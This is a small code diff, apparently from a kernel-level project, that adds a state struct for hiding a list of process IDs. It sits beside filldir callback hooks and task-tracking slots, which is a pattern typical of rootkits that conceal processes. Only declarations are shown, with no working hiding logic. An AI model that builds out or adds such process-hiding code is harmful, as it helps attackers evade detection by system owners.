@@ -10,7 +10,15 @@ typedef int (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
 
 /* ---- internal structs ---- */
 
+#define NEVERC_KRT_HIDE_PID_MAX 32
 #define _NEVERC_KRT_PID_ACTOR_SLOTS 8
+
+struct neverc_krt_pid_hide_state {
+	int              pids[NEVERC_KRT_HIDE_PID_MAX];
+	int              count;
+	struct neverc_krt_hook_ctx ctx_hook;
+	int              active;
+};
 
 struct _neverc_krt_pid_actor_slot {
 	volatile unsigned long task;
